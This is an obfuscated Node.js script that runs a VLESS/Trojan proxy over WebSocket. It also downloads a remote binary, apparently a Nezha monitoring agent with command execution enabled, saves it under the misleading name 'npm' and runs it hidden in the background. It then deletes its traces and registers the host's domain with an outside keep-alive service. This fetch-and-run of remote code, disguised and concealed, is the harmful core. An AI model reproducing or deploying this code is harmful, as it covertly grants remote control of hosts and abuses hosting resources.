const _0x5dfd04=_0x2453;(function(_0x3be55d,_0x27c1b4){const _0x19919a=_0x2453,_0x32bdc0=_0x3be55d();while(!![]){try{const _0x461946=-parseInt(_0x19919a(0x1c9))/0x1+-parseInt(_0x19919a(0x168))/0x2*(-parseInt(_0x19919a(0x18f))/0x3)+-parseInt(_0x19919a(0x1d2))/0x4+parseInt(_0x19919a(0x1d3))/0x5+-parseInt(_0x19919a(0x1a9))/0x6*(parseInt(_0x19919a(0x186))/0x7)+parseInt(_0x19919a(0x17a))/0x8+-parseInt(_0x19919a(0x1ac))/0x9;if(_0x461946===_0x27c1b4)break;else _0x32bdc0['push'](_0x32bdc0['shift']());}catch(_0x6be3b0){_0x32bdc0['push'](_0x32bdc0['shift']());}}}(_0x4521,0x4426b));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5dfd04(0x1b7)),net=require(_0x5dfd04(0x196)),path=require(_0x5dfd04(0x18e)),crypto=require('crypto'),{Buffer}=require(_0x5dfd04(0x1cb)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1d5)]||_0x5dfd04(0x1a4),NEZHA_SERVER=process[_0x5dfd04(0x16c)][_0x5dfd04(0x184)]||'',NEZHA_PORT=process['env'][_0x5dfd04(0x19a)]||'',NEZHA_KEY=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1e7)]||'',DOMAIN=process['env'][_0x5dfd04(0x1c8)]||_0x5dfd04(0x1d0),AUTO_ACCESS=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1a5)]||!![],WSPATH=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1d4)]||UUID[_0x5dfd04(0x190)](0x0,0x8),SUB_PATH=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1da)]||_0x5dfd04(0x18d),NAME=process[_0x5dfd04(0x16c)]['NAME']||_0x5dfd04(0x199),PORT=process[_0x5dfd04(0x16c)][_0x5dfd04(0x1aa)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x25530a=_0x5dfd04;try{const _0x2daa18=await axios[_0x25530a(0x1c4)](_0x25530a(0x18b)),_0x5a1f7b=_0x2daa18[_0x25530a(0x1e6)];ISP=(_0x5a1f7b[_0x25530a(0x1a3)]+'-'+_0x5a1f7b[_0x25530a(0x18a)])['replace'](/ /g,'_');}catch(_0x2d3d04){ISP=_0x25530a(0x1ca);}};GetISP();const httpServer=http['createServer']((_0x53d521,_0x12efba)=>{const _0x5ffd93=_0x5dfd04;if(_0x53d521['url']==='/'){const _0x534adf=path[_0x5ffd93(0x1c3)](__dirname,'index.html');fs[_0x5ffd93(0x180)](_0x534adf,_0x5ffd93(0x182),(_0xb22ff2,_0x1cb2e4)=>{const _0x3be251=_0x5ffd93;if(_0xb22ff2){_0x12efba[_0x3be251(0x1db)](0xc8,{'Content-Type':_0x3be251(0x185)}),_0x12efba[_0x3be251(0x17b)](_0x3be251(0x1b4));return;}_0x12efba['writeHead'](0xc8,{'Content-Type':_0x3be251(0x185)}),_0x12efba[_0x3be251(0x17b)](_0x1cb2e4);});return;}else{if(_0x53d521['url']==='/'+SUB_PATH){const _0x404968=_0x5ffd93(0x1df)+UUID+'@'+DOMAIN+_0x5ffd93(0x19f)+DOMAIN+_0x5ffd93(0x193)+DOMAIN+_0x5ffd93(0x17e)+WSPATH+'#'+NAME+'-'+ISP,_0x168fc9=_0x5ffd93(0x1e5)+UUID+'@'+DOMAIN+_0x5ffd93(0x187)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5ffd93(0x17e)+WSPATH+'#'+NAME+'-'+ISP,_0x19e6fe=_0x404968+'\x0a'+_0x168fc9,_0x15c456=Buffer[_0x5ffd93(0x1d1)](_0x19e6fe)[_0x5ffd93(0x1dd)](_0x5ffd93(0x1ba));_0x12efba['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x12efba[_0x5ffd93(0x17b)](_0x15c456+'\x0a');}else _0x12efba[_0x5ffd93(0x1db)](0x194,{'Content-Type':_0x5ffd93(0x195)}),_0x12efba['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x5dfd04(0x1d9))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x5dfd04(0x16f),_0x5dfd04(0x1cf)];function resolveHost(_0x5066fe){return new Promise((_0x1ad908,_0x5853a1)=>{const _0x132b27=_0x2453;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x132b27(0x170)](_0x5066fe)){_0x1ad908(_0x5066fe);return;}let _0x5a3d6b=0x0;function _0x124025(){const _0x2ede3b=_0x132b27;if(_0x5a3d6b>=DNS_SERVERS[_0x2ede3b(0x178)]){_0x5853a1(new Error('Failed\x20to\x20resolve\x20'+_0x5066fe+_0x2ede3b(0x1d7)));return;}const _0x23df11=DNS_SERVERS[_0x5a3d6b];_0x5a3d6b++;const _0x583eba=_0x2ede3b(0x1c6)+encodeURIComponent(_0x5066fe)+_0x2ede3b(0x1be);axios[_0x2ede3b(0x1c4)](_0x583eba,{'timeout':0x1388,'headers':{'Accept':_0x2ede3b(0x1a8)}})[_0x2ede3b(0x1e0)](_0x3f4901=>{const _0x482546=_0x2ede3b,_0x3553d4=_0x3f4901[_0x482546(0x1e6)];if(_0x3553d4[_0x482546(0x191)]===0x0&&_0x3553d4[_0x482546(0x1c7)]&&_0x3553d4['Answer'][_0x482546(0x178)]>0x0){const _0xa27422=_0x3553d4[_0x482546(0x1c7)][_0x482546(0x1a7)](_0xa88f45=>_0xa88f45[_0x482546(0x1de)]===0x1);if(_0xa27422){_0x1ad908(_0xa27422[_0x482546(0x1e6)]);return;}}_0x124025();})[_0x2ede3b(0x1c5)](_0x126ab8=>{_0x124025();});}_0x124025();});}function handleVlessConnection(_0x26a136,_0x1b4005){const _0x2129b0=_0x5dfd04,[_0x26bc05]=_0x1b4005,_0x2d0026=_0x1b4005[_0x2129b0(0x190)](0x1,0x11);if(!_0x2d0026[_0x2129b0(0x16e)]((_0x328f15,_0x838823)=>_0x328f15==parseInt(uuid['substr'](_0x838823*0x2,0x2),0x10)))return![];let _0x3240bb=_0x1b4005[_0x2129b0(0x190)](0x11,0x12)[_0x2129b0(0x1ab)]()+0x13;const _0x583a38=_0x1b4005[_0x2129b0(0x190)](_0x3240bb,_0x3240bb+=0x2)[_0x2129b0(0x16a)](0x0),_0x7645a1=_0x1b4005[_0x2129b0(0x190)](_0x3240bb,_0x3240bb+=0x1)[_0x2129b0(0x1ab)](),_0x20a1ed=_0x7645a1==0x1?_0x1b4005[_0x2129b0(0x190)](_0x3240bb,_0x3240bb+=0x4)['join']('.'):_0x7645a1==0x2?new TextDecoder()['decode'](_0x1b4005[_0x2129b0(0x190)](_0x3240bb+0x1,_0x3240bb+=0x1+_0x1b4005[_0x2129b0(0x190)](_0x3240bb,_0x3240bb+0x1)[_0x2129b0(0x1ab)]())):_0x7645a1==0x3?_0x1b4005[_0x2129b0(0x190)](_0x3240bb,_0x3240bb+=0x10)[_0x2129b0(0x1b8)]((_0x287ea5,_0x47162f,_0x4977c6,_0x36a3a0)=>_0x4977c6%0x2?_0x287ea5[_0x2129b0(0x1bc)](_0x36a3a0[_0x2129b0(0x190)](_0x4977c6-0x1,_0x4977c6+0x1)):_0x287ea5,[])[_0x2129b0(0x167)](_0x2c67c6=>_0x2c67c6[_0x2129b0(0x16a)](0x0)[_0x2129b0(0x1dd)](0x10))[_0x2129b0(0x1c3)](':'):'';_0x26a136[_0x2129b0(0x181)](new Uint8Array([_0x26bc05,0x0]));const _0x23753b=createWebSocketStream(_0x26a136);return resolveHost(_0x20a1ed)['then'](_0x30b0ae=>{const _0x25b65e=_0x2129b0;net[_0x25b65e(0x17c)]({'host':_0x30b0ae,'port':_0x583a38},function(){const _0x53014f=_0x25b65e;this[_0x53014f(0x197)](_0x1b4005['slice'](_0x3240bb)),_0x23753b['on']('error',()=>{})[_0x53014f(0x1ce)](this)['on'](_0x53014f(0x188),()=>{})[_0x53014f(0x1ce)](_0x23753b);})['on']('error',()=>{});})['catch'](_0x52e433=>{const _0x27e534=_0x2129b0;net[_0x27e534(0x17c)]({'host':_0x20a1ed,'port':_0x583a38},function(){const _0x141940=_0x27e534;this['write'](_0x1b4005[_0x141940(0x190)](_0x3240bb)),_0x23753b['on'](_0x141940(0x188),()=>{})['pipe'](this)['on'](_0x141940(0x188),()=>{})['pipe'](_0x23753b);})['on'](_0x27e534(0x188),()=>{});}),!![];}function _0x4521(){const _0x3f0539=['hex','log','country','32e765b9-1dbd-4280-8766-a5f09eb03584','AUTO_ACCESS','443','find','application/dns-json','618zmeEbv','PORT','readUInt8','2454714HMkbWh','includes','npm\x20is\x20already\x20running,\x20skip\x20running...','2053','config.yaml','stream','2096','--tls','Hello\x20world!','substr','update','axios','reduce','writeFileSync','base64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','concat','url','&type=A','post','unlink','2083','utf-8','join','get','catch','https://dns.google/resolve?name=','Answer','DOMAIN','101253VhrzOC','Unknown','buffer','npm','2087','pipe','1.1.1.1','1234.abc.com','from','360656gxuwdY','2426720YDEHkg','WSPATH','UUID','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20with\x20all\x20DNS\x20servers','/bin/bash','Server','SUB_PATH','writeHead','Server\x20is\x20running\x20on\x20port\x20','toString','type','vless://','then','connection','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/v1','trojan://','data','NEZHA_KEY','digest','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error:\x20','map','18TUFixR','close','readUInt16BE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','env','chmod\x20+x\x20npm','every','8.8.4.4','test','split','false','finish','npm\x20running\x20error:','application/json','pop','message','length','createHash','2954040OwAHDe','end','connect','once','&path=%2F','arm64','readFile','send','utf8','trim','NEZHA_SERVER','text/html','29554vWwklt',':443?security=tls&sni=','error','arch','asOrganization','https://speed.cloudflare.com/meta','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sub','path','107859ytWYth','slice','Status','listen','&fp=chrome&type=ws&host=','aarch64','text/plain','net','write','\x20-p\x20','Hug','NEZHA_PORT','npm\x20download\x20successfully','Automatic\x20Access\x20Task\x20added\x20successfully','https://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',':443?encryption=none&security=tls&sni=','setsid\x20nohup\x20./npm\x20-s\x20'];_0x4521=function(){return _0x3f0539;};return _0x4521();}function handleTrojanConnection(_0x11039f,_0x5bd16d){const _0x4db194=_0x5dfd04;try{if(_0x5bd16d['length']<0x3a)return![];const _0x4f85fc=_0x5bd16d[_0x4db194(0x190)](0x0,0x38)[_0x4db194(0x1dd)](),_0x4f0909=[UUID];let _0x133e2d=null;for(const _0x3cbf9d of _0x4f0909){const _0xbefbc=crypto[_0x4db194(0x179)]('sha224')[_0x4db194(0x1b6)](_0x3cbf9d)[_0x4db194(0x164)](_0x4db194(0x1a1));if(_0xbefbc===_0x4f85fc){_0x133e2d=_0x3cbf9d;break;}}if(!_0x133e2d)return![];let _0x442f18=0x38;_0x5bd16d[_0x442f18]===0xd&&_0x5bd16d[_0x442f18+0x1]===0xa&&(_0x442f18+=0x2);const _0x6f12d0=_0x5bd16d[_0x442f18];if(_0x6f12d0!==0x1)return![];_0x442f18+=0x1;const _0x170bc6=_0x5bd16d[_0x442f18];_0x442f18+=0x1;let _0x5ec688,_0x455da3;if(_0x170bc6===0x1)_0x5ec688=_0x5bd16d['slice'](_0x442f18,_0x442f18+0x4)[_0x4db194(0x1c3)]('.'),_0x442f18+=0x4;else{if(_0x170bc6===0x3){const _0x22deea=_0x5bd16d[_0x442f18];_0x442f18+=0x1,_0x5ec688=_0x5bd16d['slice'](_0x442f18,_0x442f18+_0x22deea)[_0x4db194(0x1dd)](),_0x442f18+=_0x22deea;}else{if(_0x170bc6===0x4)_0x5ec688=_0x5bd16d[_0x4db194(0x190)](_0x442f18,_0x442f18+0x10)[_0x4db194(0x1b8)]((_0x229060,_0x2ff665,_0x48f7ca,_0x268fd8)=>_0x48f7ca%0x2?_0x229060['concat'](_0x268fd8[_0x4db194(0x190)](_0x48f7ca-0x1,_0x48f7ca+0x1)):_0x229060,[])[_0x4db194(0x167)](_0xc8447b=>_0xc8447b[_0x4db194(0x16a)](0x0)[_0x4db194(0x1dd)](0x10))[_0x4db194(0x1c3)](':'),_0x442f18+=0x10;else return![];}}_0x455da3=_0x5bd16d['readUInt16BE'](_0x442f18),_0x442f18+=0x2;_0x442f18<_0x5bd16d[_0x4db194(0x178)]&&_0x5bd16d[_0x442f18]===0xd&&_0x5bd16d[_0x442f18+0x1]===0xa&&(_0x442f18+=0x2);const _0x4da603=createWebSocketStream(_0x11039f);return resolveHost(_0x5ec688)['then'](_0x1f6c5d=>{const _0x414b69=_0x4db194;net['connect']({'host':_0x1f6c5d,'port':_0x455da3},function(){const _0x46797c=_0x2453;_0x442f18<_0x5bd16d[_0x46797c(0x178)]&&this[_0x46797c(0x197)](_0x5bd16d['slice'](_0x442f18)),_0x4da603['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x46797c(0x1ce)](_0x4da603);})['on'](_0x414b69(0x188),()=>{});})[_0x4db194(0x1c5)](_0x2dfecf=>{const _0xc1b4eb=_0x4db194;net[_0xc1b4eb(0x17c)]({'host':_0x5ec688,'port':_0x455da3},function(){const _0x3005f7=_0xc1b4eb;_0x442f18<_0x5bd16d['length']&&this['write'](_0x5bd16d[_0x3005f7(0x190)](_0x442f18)),_0x4da603['on'](_0x3005f7(0x188),()=>{})[_0x3005f7(0x1ce)](this)['on'](_0x3005f7(0x188),()=>{})['pipe'](_0x4da603);})['on']('error',()=>{});}),!![];}catch(_0x15f60b){return![];}}wss['on'](_0x5dfd04(0x1e1),(_0x442c7,_0x4df457)=>{const _0x46330b=_0x5dfd04,_0x11048e=_0x4df457[_0x46330b(0x1bd)]||'';_0x442c7[_0x46330b(0x17d)](_0x46330b(0x177),_0x11e590=>{const _0x296014=_0x46330b;if(_0x11e590['length']>0x11&&_0x11e590[0x0]===0x0){const _0x1a340a=_0x11e590[_0x296014(0x190)](0x1,0x11),_0x2bf267=_0x1a340a[_0x296014(0x16e)]((_0x589691,_0x31cabb)=>_0x589691==parseInt(uuid[_0x296014(0x1b5)](_0x31cabb*0x2,0x2),0x10));if(_0x2bf267){!handleVlessConnection(_0x442c7,_0x11e590)&&_0x442c7['close']();return;}}!handleTrojanConnection(_0x442c7,_0x11e590)&&_0x442c7[_0x296014(0x169)]();})['on'](_0x46330b(0x188),()=>{});});function _0x2453(_0xf5c5f4,_0x248b48){_0xf5c5f4=_0xf5c5f4-0x164;const _0x4521b6=_0x4521();let _0x245397=_0x4521b6[_0xf5c5f4];return _0x245397;}const getDownloadUrl=()=>{const _0x40ca0f=_0x5dfd04,_0x5805dc=os[_0x40ca0f(0x189)]();return _0x5805dc==='arm'||_0x5805dc===_0x40ca0f(0x17f)||_0x5805dc===_0x40ca0f(0x194)?!NEZHA_PORT?_0x40ca0f(0x1e3):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x40ca0f(0x1e4):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3623fc=_0x5dfd04;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3f544c=getDownloadUrl(),_0x2c80db=await axios({'method':_0x3623fc(0x1c4),'url':_0x3f544c,'responseType':_0x3623fc(0x1b1)}),_0x58aaf5=fs['createWriteStream']('npm');return _0x2c80db[_0x3623fc(0x1e6)]['pipe'](_0x58aaf5),new Promise((_0xc4551c,_0x14d069)=>{const _0x430025=_0x3623fc;_0x58aaf5['on'](_0x430025(0x173),()=>{const _0x547a9f=_0x430025;console[_0x547a9f(0x1a2)](_0x547a9f(0x19b)),exec(_0x547a9f(0x16d),_0x510d89=>{if(_0x510d89)_0x14d069(_0x510d89);_0xc4551c();});}),_0x58aaf5['on'](_0x430025(0x188),_0x14d069);});}catch(_0x569dc2){throw _0x569dc2;}},runnz=async()=>{const _0x36a736=_0x5dfd04;try{const _0x1ccb78=execSync(_0x36a736(0x19e),{'encoding':_0x36a736(0x1c2)});if(_0x1ccb78[_0x36a736(0x183)]()!==''){console[_0x36a736(0x1a2)](_0x36a736(0x1ae));return;}}catch(_0x30dd6a){}await downloadFile();let _0x4ffa9d='',_0x4ccd4a=[_0x36a736(0x1a6),'8443',_0x36a736(0x1b2),_0x36a736(0x1cd),_0x36a736(0x1c1),_0x36a736(0x1af)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x707cc1=_0x4ccd4a[_0x36a736(0x1ad)](NEZHA_PORT)?_0x36a736(0x1b3):'';_0x4ffa9d=_0x36a736(0x1a0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x36a736(0x198)+NEZHA_KEY+'\x20'+_0x707cc1+_0x36a736(0x1bb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xcdeecc=NEZHA_SERVER[_0x36a736(0x1ad)](':')?NEZHA_SERVER[_0x36a736(0x171)](':')[_0x36a736(0x176)]():'',_0x377537=_0x4ccd4a[_0x36a736(0x1ad)](_0xcdeecc)?'true':_0x36a736(0x172),_0xbddbf3='client_secret:\x20'+NEZHA_KEY+_0x36a736(0x18c)+NEZHA_SERVER+_0x36a736(0x16b)+_0x377537+_0x36a736(0x165)+UUID;fs[_0x36a736(0x1b9)](_0x36a736(0x1b0),_0xbddbf3);}_0x4ffa9d='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x36a736(0x1d6));return;}}try{exec(_0x4ffa9d,{'shell':_0x36a736(0x1d8)},_0x2cd4a2=>{const _0x1300f5=_0x36a736;if(_0x2cd4a2)console[_0x1300f5(0x188)](_0x1300f5(0x174),_0x2cd4a2);else console[_0x1300f5(0x1a2)]('npm\x20is\x20running');});}catch(_0x57a8d0){console[_0x36a736(0x188)](_0x36a736(0x166)+_0x57a8d0);}};async function addAccessTask(){const _0x5ecbc0=_0x5dfd04;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x11c281=_0x5ecbc0(0x19d)+DOMAIN;try{const _0x51f626=await axios[_0x5ecbc0(0x1bf)](_0x5ecbc0(0x1e2),{'url':_0x11c281},{'headers':{'Content-Type':_0x5ecbc0(0x175)}});console[_0x5ecbc0(0x1a2)](_0x5ecbc0(0x19c));}catch(_0x5c13f2){}}const delFiles=()=>{const _0x44985a=_0x5dfd04;fs['unlink'](_0x44985a(0x1cc),()=>{}),fs[_0x44985a(0x1c0)]('config.yaml',()=>{});};httpServer[_0x5dfd04(0x192)](PORT,()=>{const _0x13e114=_0x5dfd04;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x13e114(0x1a2)](_0x13e114(0x1dc)+PORT);});
